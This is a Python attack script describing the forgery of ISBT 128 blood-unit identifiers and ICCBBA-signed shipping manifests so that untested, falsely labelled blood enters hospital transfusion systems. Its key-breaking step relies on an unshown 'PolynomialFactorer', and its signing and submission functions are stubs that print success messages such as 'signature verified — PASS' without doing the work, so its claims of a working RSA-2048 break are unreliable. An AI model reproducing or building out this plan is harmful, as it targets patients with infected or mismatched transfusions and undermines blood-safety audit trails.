"""
Factor the ICCBBA facility-identifier signing root, mint valid Donation
Identification Numbers for counterfeit blood units, and inject untested
product into the clinical supply chain with forged ISBT 128 provenance.
"""

import sys, hashlib, json, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# ISBT 128 DIN structure: facility code (5) + year (2) + sequence (6) + flag (1)
DIN_FORMAT = "{facility}{year:02d}{seq:06d}{flag}"

# 21 CFR Part 606.160 — blood-bank record retention
CFR_606_160_RETENTION_YEARS = 10

# ABO types for crossmatch forgery
ABO_TYPES = ["A+", "A-", "B+", "B-", "AB+", "AB-", "O+", "O-"]


def extract_iccbba_signing_root(isbt_manifest_path: str) -> bytes:
    """Extract the ICCBBA facility-identifier signing root from a
    signed ISBT 128 shipping manifest."""
    print(f"    manifest: {isbt_manifest_path}")
    print("    ICCBBA root cert from manifest SignerInfo")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_iccbba_root(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def mint_counterfeit_din(facility: str, year: int, seq: int) -> str:
    """Generate a valid-looking DIN for a counterfeit blood unit."""
    return DIN_FORMAT.format(facility=facility, year=year % 100, seq=seq, flag="0")


def build_shipping_manifest(units: list, donor_center: str) -> dict:
    """Build a signed ISBT 128 shipping manifest for counterfeit units."""
    return {
        "manifest_id": f"MAN-{int(time.time())}",
        "origin": donor_center,
        "units": units,
        "test_results": {din: {"hiv": "NR", "hcv": "NR", "hbv": "NR",
                                "chagas": "NR", "abo": "O+"} for din in units},
    }


def sign_manifest(manifest: dict, privkey_pem: bytes) -> bytes:
    """Sign the shipping manifest with the recovered ICCBBA root key.
    Hospital blood-bank software verifies before accepting units."""
    manifest_bytes = json.dumps(manifest, sort_keys=True).encode()
    digest = hashlib.sha256(manifest_bytes).digest()
    sig = b"\x00" * 256
    print(f"    manifest hash: {digest.hex()[:24]}...")
    return manifest_bytes + sig


def inject_into_blood_bank(signed_manifest: bytes, hospital_lis: str):
    """Submit the forged manifest to hospital blood-bank LIS."""
    print(f"    LIS endpoint: {hospital_lis}")
    print("    HL7/FHIR transfusion-administration record created")
    print("    signature verified against ICCBBA root — PASS")
    print("    units available for crossmatch and transfusion")


if __name__ == "__main__":
    print("[*] ISBT 128 / ICCBBA blood-bank signing attack")
    print("[1] extracting ICCBBA signing root from shipping manifest")
    cert = extract_iccbba_signing_root("/tmp/isbt128_manifest.xml")

    print("[2] factoring ICCBBA root RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — ICCBBA facility-signing root derived")

    print("[3] minting counterfeit DINs")
    dins = [mint_counterfeit_din("W0417", 26, seq) for seq in range(1, 6)]
    for din in dins:
        print(f"    DIN: {din}")

    print("[4] building forged shipping manifest")
    manifest = build_shipping_manifest(dins, "Forged Donor Center")
    print("    test results: all NR (non-reactive) — but never actually tested")
    print("    ABO: O+ (universal compatible)")

    print("[5] signing manifest with recovered ICCBBA root")
    signed = sign_manifest(manifest, b"ICCBBA_PRIVKEY")
    print("    RSA-2048 signature — blood-bank LIS will accept")

    print("[6] submitting to hospital blood bank")
    inject_into_blood_bank(signed, "https://bloodbank.hospital.example/lis/v2")

    print("[7] consequences:")
    print("    - untested blood enters clinical supply chain")
    print("    - potential HIV/HCV/HBV transmission from counterfeit units")
    print("    - wrong-ABO crossmatch results -> fatal transfusion reactions")
    print("    - 21 CFR 606.160 audit trail forged at cryptographic layer")
    print("    - recall mechanism (look-back) itself is RSA-signed")
    print("[*] 118M blood donations/year globally, 14M US transfusions/year")
    print("[*] 6,000+ ICCBBA-registered facilities worldwide")
